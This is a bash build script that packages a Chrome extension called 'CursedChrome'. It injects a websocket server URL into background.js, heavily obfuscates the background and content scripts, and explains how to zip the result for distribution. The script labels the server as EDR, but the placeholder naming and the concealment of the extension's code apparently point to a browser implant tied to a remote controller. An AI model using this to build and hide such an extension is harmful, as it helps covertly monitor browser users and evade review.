#!/usr/bin/env bash
set -euo pipefail

# build-extension.sh — Package the CursedChrome extension with the
# EDR server URL baked in and background.js obfuscated.
#
# Usage:
#   ./scripts/build-extension.sh --server-url wss://edr.corp.example.com
#
# Output: dist/extension/ (a directory Chrome can load directly via
# "Load unpacked", or zip for distribution).

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
EXT_SRC="$PROJECT_ROOT/extension"
DIST="$PROJECT_ROOT/dist/extension"

SERVER_URL=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --server-url)
      SERVER_URL="$2"
      shift 2
      ;;
    -h|--help)
      echo "Usage: $0 --server-url <wss://your-edr-server>"
      echo ""
      echo "Builds the Chrome extension with the EDR server URL"
      echo "hardcoded and background.js obfuscated."
      echo ""
      echo "Output: dist/extension/"
      exit 0
      ;;
    *)
      echo "Unknown option: $1" >&2
      exit 1
      ;;
  esac
done

if [[ -z "$SERVER_URL" ]]; then
  echo "ERROR: --server-url is required" >&2
  echo "Usage: $0 --server-url wss://edr.corp.example.com" >&2
  exit 1
fi

echo "==> Building extension with server: $SERVER_URL"

# Ensure javascript-obfuscator is available
if ! command -v javascript-obfuscator &>/dev/null; then
  if [[ -x "$PROJECT_ROOT/node_modules/.bin/javascript-obfuscator" ]]; then
    OBFUSCATOR="$PROJECT_ROOT/node_modules/.bin/javascript-obfuscator"
  else
    echo "Installing javascript-obfuscator..."
    cd "$PROJECT_ROOT"
    npm install --save-dev javascript-obfuscator 2>/dev/null
    OBFUSCATOR="$PROJECT_ROOT/node_modules/.bin/javascript-obfuscator"
  fi
else
  OBFUSCATOR="javascript-obfuscator"
fi

# Clean and copy
rm -rf "$DIST"
mkdir -p "$DIST"
cp -r "$EXT_SRC"/* "$DIST"/

# Replace placeholder with real URL in background.js
BG_FILE="$DIST/src/bg/background.js"
if ! grep -q '__CURSED_SERVER_URL__' "$BG_FILE"; then
  echo "ERROR: Placeholder __CURSED_SERVER_URL__ not found in background.js" >&2
  echo "Has the source file already been built?" >&2
  exit 1
fi

sed -i'' -e "s|__CURSED_SERVER_URL__|${SERVER_URL}|g" "$BG_FILE"
echo "==> Server URL injected"

# Obfuscate background.js
echo "==> Obfuscating background.js..."
"$OBFUSCATOR" "$BG_FILE" \
  --output "$BG_FILE" \
  --compact true \
  --control-flow-flattening true \
  --control-flow-flattening-threshold 0.5 \
  --dead-code-injection true \
  --dead-code-injection-threshold 0.2 \
  --string-array true \
  --string-array-encoding base64 \
  --string-array-threshold 0.8 \
  --split-strings true \
  --split-strings-chunk-length 8 \
  --rename-globals false \
  --self-defending false \
  --target browser \
  --unicode-escape-sequence false

echo "==> Obfuscation complete"

# Also obfuscate content scripts
for CS in "$DIST/src/content/"*.js "$DIST/src/offscreen/"*.js; do
  if [[ -f "$CS" ]]; then
    echo "==> Obfuscating $(basename "$CS")..."
    "$OBFUSCATOR" "$CS" \
      --output "$CS" \
      --compact true \
      --string-array true \
      --string-array-encoding base64 \
      --string-array-threshold 0.6 \
      --split-strings true \
      --split-strings-chunk-length 10 \
      --rename-globals false \
      --self-defending false \
      --target browser
  fi
done

# Report output
TOTAL_SIZE=$(du -sh "$DIST" | cut -f1)
echo ""
echo "==> Build complete: $DIST ($TOTAL_SIZE)"
echo "    Load in Chrome via chrome://extensions/ → Load unpacked"
echo ""
echo "    To create a .zip for distribution:"
echo "    cd dist && zip -r cursed-extension.zip extension/"
